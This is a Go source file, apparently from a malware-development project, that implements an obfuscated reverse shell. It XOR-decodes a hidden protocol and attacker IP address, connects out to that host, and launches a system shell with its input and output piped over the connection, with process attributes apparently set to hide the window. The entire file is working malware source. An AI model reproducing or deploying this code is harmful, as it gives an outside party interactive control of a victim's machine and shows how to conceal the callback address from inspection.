package main

import (
	"net"
	"os/exec"
	"testes/maldev/payload/src/utils"
	
)

func main() {
	kb := utils.XorKey
	p := []byte{27, 4, 31}
	aip := []byte{93, 86, 92, 73, 94, 94, 86, 73, 91, 81, 65, 85, 95, 82, 85, 86, 86, 94, 86, 94}
	c, e := net.Dial(string(utils.Xor(p, kb)), string(utils.Xor(aip, kb)))
	if e != nil {
		return

	}

	defer c.Close()
	var s, spa = utils.PlatfAtr()
	cc := exec.Command(string(utils.Xor(s, kb)))
	cc.SysProcAttr = &spa
	cc.Stdin = c
	cc.Stderr = c
	cc.Stdout = c

	_ = cc.Run()

}
